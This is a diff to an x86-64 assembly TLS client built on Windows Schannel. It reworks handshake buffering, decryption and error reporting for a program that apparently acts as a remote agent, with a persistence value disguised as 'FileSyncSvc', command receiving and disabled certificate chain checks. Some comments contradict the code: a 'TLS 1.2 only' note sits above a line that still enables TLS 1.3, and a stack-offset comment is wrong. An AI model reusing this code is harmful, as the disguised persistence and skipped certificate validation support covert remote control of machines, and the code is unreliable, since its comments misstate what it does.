@@ -303,7 +303,7 @@ tls_context_established: resd 1     ; 1 if TLS handshake completed
 
 ; --- Schannel working buffers ---
 schannel_cred:      resb SCHANNEL_CRED_SIZE
-sec_buf_in:         resb SECBUFFER_SIZE
+sec_buf_in:         resb SECBUFFER_SIZE * 4  ; 4-buffer layout: EXTRA reporting
 sec_buf_out:        resb SECBUFFER_SIZE
 sec_buf_desc_in:    resb SECBUFFERDESC_SIZE
 sec_buf_desc_out:   resb SECBUFFERDESC_SIZE
@@ -771,6 +771,9 @@ tls_connect:
     ; Set SCHANNEL_CRED fields (x64 layout)
     lea rdi, [schannel_cred]
     mov dword [rdi + SCHANNEL_CRED_OFF_VERSION], 4   ; dwVersion = SCHANNEL_CRED_VERSION
+    ; TLS 1.2 only: Schannel on Win10 19045 mishandles post-handshake
+    ; TLS 1.3 NewSessionTicket records (EncryptMessage then fails with
+    ; SEC_E_MESSAGE_ALTERED); the Go gateway fully supports 1.2.
     mov dword [rdi + SCHANNEL_CRED_OFF_PROTOCOLS], SP_PROT_TLS1_3_CLIENT | SP_PROT_TLS1_2_CLIENT
     ; SCH_CRED_MANUAL_CRED_VALIDATION: server cert is not chained against the
     ; system root store (deployment CA is private); inner AEAD still authenticates.
@@ -834,7 +837,36 @@ tls_connect:
     je .tc_send_recv
     cmp eax, SEC_E_OK
     jne .tc_fail
-    ; handshake complete: flush any final token, then query stream sizes
+
+    ; handshake complete: salvage unconsumed input (tickets, early app
+    ; records) reported as SECBUFFER_EXTRA in the input descriptor
+    lea rbx, [sec_buf_in]
+    mov eax, 0                      ; buffer offset
+.tc_extra_scan:
+    cmp eax, 64
+    jae .tc_extra_none
+    cmp dword [rbx + rax + 4], SECBUFFER_EXTRA
+    jne .tc_extra_next
+    mov ecx, [rbx + rax]            ; extra byte count
+    test ecx, ecx
+    jz .tc_extra_next
+    push rsi
+    push rdi
+    mov rsi, [rbx + rax + 8]
+    lea rdi, [tls_recv_buf]
+    mov edx, ecx
+    rep movsb
+    mov [tls_recv_len], edx
+    pop rdi
+    pop rsi
+    jmp .tc_query_sizes
+.tc_extra_next:
+    add eax, 16
+    jmp .tc_extra_scan
+.tc_extra_none:
+    mov dword [tls_recv_len], 0
+
+    ; flush any final token, then query stream sizes
     cmp dword [sec_buf_out], 0
     je .tc_query_sizes
     mov rcx, [sec_buf_out + 8]
@@ -866,16 +898,28 @@ tls_connect:
     jle .tc_fail
     add [tls_recv_len], eax
 
-    ; input SecBuffer = everything received so far
+    ; input SecBuffers: [0]=TOKEN(everything received so far), [1..3]=EMPTY
+    ; (the 4-buffer layout lets Schannel report unconsumed input as
+    ; SECBUFFER_EXTRA - a single-buffer descriptor cannot, and the tail
+    ; bytes would be decrypted as application data afterwards)
     lea rdi, [sec_buf_in]
     mov eax, [tls_recv_len]
     mov dword [rdi], eax
     mov dword [rdi + 4], SECBUFFER_TOKEN
     lea rax, [tls_recv_buf]
     mov qword [rdi + 8], rax
+    mov dword [rdi + 16], 0
+    mov dword [rdi + 20], SECBUFFER_EMPTY
+    mov qword [rdi + 24], 0
+    mov dword [rdi + 32], 0
+    mov dword [rdi + 36], SECBUFFER_EMPTY
+    mov qword [rdi + 40], 0
+    mov dword [rdi + 48], 0
+    mov dword [rdi + 52], SECBUFFER_EMPTY
+    mov qword [rdi + 56], 0
     lea rdi, [sec_buf_desc_in]
     mov dword [rdi], 0
-    mov dword [rdi + 4], 1
+    mov dword [rdi + 4], 4
     lea rax, [sec_buf_in]
     mov qword [rdi + 8], rax
 
@@ -942,6 +986,58 @@ tls_connect:
 ; Input: rcx = plaintext buffer, rdx = length
 ; Returns: 1 on success, 0 on failure
 ; ===========================================================================
+; sspi_report_fail: eax = SSPI code, cl = site tag char.
+; Sends an exception frame SSPI-X<8hex> pinpointing the failing call.
+sspi_report_fail:
+    cmp byte [sspi_reporting], 0
+    jne .sr_skip                     ; already reporting: no recursion
+    mov byte [sspi_reporting], 1
+    push rbx
+    push r12
+    sub rsp, 40
+
+    mov ebx, eax                     ; code
+    mov r12d, ecx                    ; site tag
+
+    mov byte [sspi_dbg_buf], 'S'
+    mov byte [sspi_dbg_buf + 1], 'S'
+    mov byte [sspi_dbg_buf + 2], 'P'
+    mov byte [sspi_dbg_buf + 3], 'I'
+    mov byte [sspi_dbg_buf + 4], '-'
+    mov [sspi_dbg_buf + 5], r12b
+
+    lea rdi, [sspi_dbg_buf]          ; RIP-relative cannot carry an
+    mov ecx, 28                      ; index: address through rdi
+    mov edx, 6                       ; output index
+.sr_nibble:
+    mov eax, ebx
+    shr eax, cl
+    and eax, 0x0F
+    cmp eax, 10
+    jb .sr_digit
+    add eax, 'A' - 10
+    jmp .sr_store
+.sr_digit:
+    add eax, '0'
+.sr_store:
+    mov [rdi + rdx], al
+    inc edx
+    sub ecx, 4
+    jns .sr_nibble
+    mov byte [sspi_dbg_buf + 14], 0
+
+    lea rcx, [sspi_dbg_buf]
+    mov edx, 15
+    call send_exception
+
+    mov byte [sspi_reporting], 0
+    pop r12
+    pop rbx
+    add rsp, 40
+    ret
+.sr_skip:
+    ret
+
 tls_send:
     sub rsp, 72
     push rbx
@@ -1023,6 +1119,10 @@ tls_send:
     ret
 
 .ts_fail:
+    mov [tls_last_enc_rc], eax
+    inc dword [tls_enc_fail]
+    mov ecx, 'E'
+    call sspi_report_fail
     add rsp, 80
     pop rsi
     pop rbx
@@ -1036,61 +1136,45 @@ tls_send:
 ; Returns: bytes copied to output buffer in eax, 0 on error/EOF
 ; ===========================================================================
 tls_recv:
-    sub rsp, 88
-    mov [rsp + 72], rcx             ; save output buffer
-    mov [rsp + 80], edx             ; save requested length
+    push rbx
+    push r12
+    push r13
+    push r14
+    sub rsp, 120                  ; entry(8) + 4 pushes(32) + 120 = 160 = 0 mod 16
+    ; frame layout:
+    ;   [rsp .. rsp+64)  4 SecBuffers
+    ;   [rsp+64..rsp+80) SecBufferDesc
+    ;   [rsp+88]         saved out ptr
+    ;   [rsp+96]         saved requested
+    ;   [rsp+80]         EXTRA pv scratch (frame-internal!)
+    mov [rsp + 88], rcx
+    mov [rsp + 96], rdx
 
-    ; Check if we have buffered decrypted data
+    ; serve from plaintext staging first
     mov eax, [tls_decrypted_len]
     sub eax, [tls_decrypted_off]
-    jle .tr_read_more
-
-    ; Return buffered data
-    mov ecx, edx                    ; requested length
-    cmp ecx, eax
-    jle .tr_have_enough
-    mov ecx, eax                    ; clamp to available
-.tr_have_enough:
-    lea rsi, [tls_decrypted_buf]
-    mov eax, [tls_decrypted_off]    ; 32-bit load: no neighbor bleed
-    add rsi, rax
-    mov rdi, [rsp + 72]             ; output buffer
-    push rcx
-    rep movsb
-    pop rax
-    add [tls_decrypted_off], eax
-    add rsp, 88
-    ret
-
-.tr_read_more:
-    ; decrypted staging is append-only (frame-boundary compaction happens
-    ; in recv_command), so partial-frame rollback stays valid
+    jg .tr_serve
 
 .tr_loop:
-    ; Read more encrypted data
+    ; need encrypted bytes? recv only when the buffer is empty
+    cmp dword [tls_recv_len], 0
+    jne .tr_have_enc
     lea rcx, [tls_recv_buf]
-    mov eax, [tls_recv_len]         ; 32-bit load: no neighbor bleed
-    add rcx, rax
     mov edx, 32768
-    sub edx, [tls_recv_len]
-    jle .tr_fail
     call tls_raw_recv
+    inc dword [tls_raw_recv_n]
     test eax, eax
     jle .tr_fail
     add [tls_recv_len], eax
+.tr_have_enc:
 
-    ; Build SecBuffer array for DecryptMessage
-    sub rsp, 64
-    mov rdi, rsp
-
-    ; SecBuffer[0]: DATA (encrypted)
+    ; SecBuffer[0] = DATA(tls_recv_buf, tls_recv_len); [1..3] EMPTY
+    lea rdi, [rsp]
     mov eax, [tls_recv_len]
-    mov dword [rdi], eax
+    mov [rdi], eax
     mov dword [rdi + 4], SECBUFFER_DATA
     lea rax, [tls_recv_buf]
-    mov qword [rdi + 8], rax
-
-    ; SecBuffer[1-3]: EMPTY
+    mov [rdi + 8], rax
     mov dword [rdi + 16], 0
     mov dword [rdi + 20], SECBUFFER_EMPTY
     mov qword [rdi + 24], 0
@@ -1100,99 +1184,156 @@ tls_recv:
     mov dword [rdi + 48], 0
     mov dword [rdi + 52], SECBUFFER_EMPTY
     mov qword [rdi + 56], 0
-
-    ; SecBufferDesc
-    sub rsp, 16
-    mov dword [rsp], 0
-    mov dword [rsp + 4], 4
-    lea rax, [rsp + 16]
-    mov qword [rsp + 8], rax
+    mov dword [rsp + 64], 0         ; desc.ulVersion
+    mov dword [rsp + 68], 4         ; desc.cBuffers
+    lea rax, [rsp]
+    mov [rsp + 72], rax             ; desc.pBuffers
 
     ; DecryptMessage(phContext, pMessage, MessageSeqNo, pfQOP)
-    ; NOTE: argument order differs from EncryptMessage (pMessage is 2nd here)
+    ; pMessage is the SECOND argument (EncryptMessage differs)
     lea rcx, [hCtxt]
-    mov rdx, rsp                    ; pMessage = &SecBufferDesc
-    xor r8d, r8d                    ; MessageSeqNo = 0
-    xor r9d, r9d                    ; pfQOP = NULL (not needed)
+    lea rdx, [rsp + 64]
+    xor r8d, r8d
+    xor r9d, r9d
     call [ptr_DecryptMessage]
 
-    ; Check for SEC_E_INCOMPLETE_MESSAGE
     cmp eax, SEC_E_INCOMPLETE_MESSAGE
-    je .tr_need_more
-
+    je .tr_recv_more                ; append bytes: partial record held
     cmp eax, SEC_E_OK
     jne .tr_dec_fail
+    inc dword [tls_dec_ok]
+    mov [tls_last_dec_rc], eax
 
-    ; Success: extract decrypted data
-    ; Find the SECBUFFER_DATA buffer (index 0 or 1)
-    lea rsi, [rsp + 16]
-    mov eax, [rsi]                  ; cbBuffer of buffer[0]
-    test eax, eax
-    jnz .tr_buf0_ok
-    ; Try buffer[1]
-    mov eax, [rsi + 16]
-    mov rsi, [rsi + 24]
-    jmp .tr_copy_decrypted
-.tr_buf0_ok:
-    mov rsi, [rsi + 8]
-
-.tr_copy_decrypted:
-    ; append new plaintext at the current fill level (32-bit load via reg:
-    ; [tls_decrypted_len] is a dword, a qword add would bleed its neighbor)
-    mov ecx, eax
-    mov edx, eax
+    ; ---- type-scan all four buffers ----
+    ; rbx = buffer base, r12 = data found, r13 = extra found,
+    ; r14d = extra byte count, [rsp+104] = extra pv
+    mov rbx, rsp
+    xor r12d, r12d
+    xor r13d, r13d
+    xor r14d, r14d
+    mov rax, 0                      ; buffer offset
+.tr_scan:
+    cmp rax, 64
+    jae .tr_scan_done
+    mov ecx, [rbx + rax + 4]        ; BufferType
+    cmp ecx, SECBUFFER_DATA
+    jne .tr_scan_not_data
+    mov r10d, [rbx + rax]           ; cbBuffer
+    test r10d, r10d
+    jnz .tr_scan_data_go
+    inc dword [tls_dec_empty]       ; empty DATA (ticket): consume
+    jmp .tr_scan_next
+.tr_scan_data_go:
+    ; append plaintext bytes to staging
+    push rax
+    push rsi
+    push rdi
+    mov rsi, [rbx + rax + 8]
+    ; staging target: tls_decrypted_buf + tls_decrypted_len
     lea rdi, [tls_decrypted_buf]
-    mov eax, [tls_decrypted_len]
-    add rdi, rax
+    mov edx, [tls_decrypted_len]
+    add rdi, rdx
+    mov ecx, r10d
+    mov edx, r10d                   ; remember length
     rep movsb
     add [tls_decrypted_len], edx
+    pop rdi
+    pop rsi
+    pop rax
+    mov r12d, 1
+    jmp .tr_scan_next
+.tr_scan_not_data:
+    cmp ecx, SECBUFFER_EXTRA
+    jne .tr_scan_next
+    mov r14d, [rbx + rax]
+    mov rcx, [rbx + rax + 8]
+    mov [rsp + 80], rcx             ; frame-internal scratch (desc ends at +80)
+    mov r13d, 1
+.tr_scan_next:
+    add rax, 16
+    jmp .tr_scan
+.tr_scan_done:
 
-    ; Handle EXTRA data buffer
-    mov eax, [rsp + 32]             ; buffer[1].cbBuffer
-    cmp dword [rsp + 36], SECBUFFER_EXTRA
-    jne .tr_no_extra
-    mov ecx, eax
-    mov rsi, [rsp + 40]
+    ; compact EXTRA to the front, or clear the encrypted buffer
+    test r13d, r13d
+    jz .tr_no_extra2
+    push rsi
+    push rdi
+    mov rsi, [rsp + 96]             ; = saved [rsp+80] behind the two pushes
     lea rdi, [tls_recv_buf]
+    mov ecx, r14d
+    mov edx, r14d
     rep movsb
-    mov [tls_recv_len], eax
-    jmp .tr_done_extra
-.tr_no_extra:
+    mov [tls_recv_len], edx
+    pop rdi
+    pop rsi
+    jmp .tr_after_extra
+.tr_no_extra2:
     mov dword [tls_recv_len], 0
-.tr_done_extra:
+.tr_after_extra:
 
-    add rsp, 80                     ; 64 + 16
+    ; real plaintext? serve it; otherwise (ticket/empty) decrypt next
+    test r12d, r12d
+    jz .tr_loop
 
-    ; Now return requested data from buffer
+.tr_serve:
     mov eax, [tls_decrypted_len]
-    mov ecx, [rsp + 80]             ; requested length
+    sub eax, [tls_decrypted_off]
+    jle .tr_loop
+    mov ecx, [rsp + 96]             ; requested
     cmp ecx, eax
-    jle .tr_ret_ok
+    jle .tr_serve_go
     mov ecx, eax
-.tr_ret_ok:
+.tr_serve_go:
+    test ecx, ecx
+    jz .tr_loop
     lea rsi, [tls_decrypted_buf]
-    mov eax, [tls_decrypted_off]    ; append-only staging: valid data starts at off
+    mov eax, [tls_decrypted_off]
     add rsi, rax
-    mov rdi, [rsp + 72]             ; output buffer
+    mov rdi, [rsp + 88]
+    mov eax, ecx                    ; return count
     rep movsb
-    add [tls_decrypted_off], ecx
-    mov eax, ecx
-    add rsp, 88
+    add [tls_decrypted_off], eax
+    add rsp, 120
+    pop r14
+    pop r13
+    pop r12
+    pop rbx
     ret
 
-.tr_need_more:
-    add rsp, 80
-    jmp .tr_loop
+.tr_recv_more:
+    mov eax, [tls_recv_len]
+    lea rcx, [tls_recv_buf]
+    add rcx, rax
+    mov edx, 32768
+    sub edx, eax
+    jle .tr_fail
+    call tls_raw_recv
+    test eax, eax
+    jle .tr_fail
+    add [tls_recv_len], eax
+    jmp .tr_have_enc
 
 .tr_dec_fail:
-    add rsp, 80                     ; undo the two buffer subs (64 + 16)
+    mov [tls_last_dec_rc], eax
+    inc dword [tls_dec_fail]
+    mov ecx, 'D'
+    call sspi_report_fail
     xor eax, eax
-    add rsp, 88
+    add rsp, 120
+    pop r14
+    pop r13
+    pop r12
+    pop rbx
     ret
 
 .tr_fail:
     xor eax, eax
-    add rsp, 88
+    add rsp, 120
+    pop r14
+    pop r13
+    pop r12
+    pop rbx
     ret
 
 ; ===========================================================================
@@ -3091,6 +3232,16 @@ section .data
 
 ; --- Sandbox executable path (wide string) ---
 persist_value_name: db "FileSyncSvc", 0
+sspi_dbg_buf:   times 16 db 0
+sspi_reporting: db 0
+tls_ctr_magic:   db "TLSCTR!1"
+tls_dec_ok:      dd 0      ; successful DecryptMessage calls
+tls_dec_empty:   dd 0      ; OK-but-empty DATA (tickets)
+tls_dec_fail:    dd 0
+tls_enc_fail:    dd 0
+tls_last_dec_rc: dd 0
+tls_last_enc_rc: dd 0
+tls_raw_recv_n:  dd 0      ; raw recv calls
 sandbox_exe_name_a: db "sandbox.exe", 0
 sandbox_exe_path:
     dw 's','a','n','d','b','o','x','.','e','x','e',0
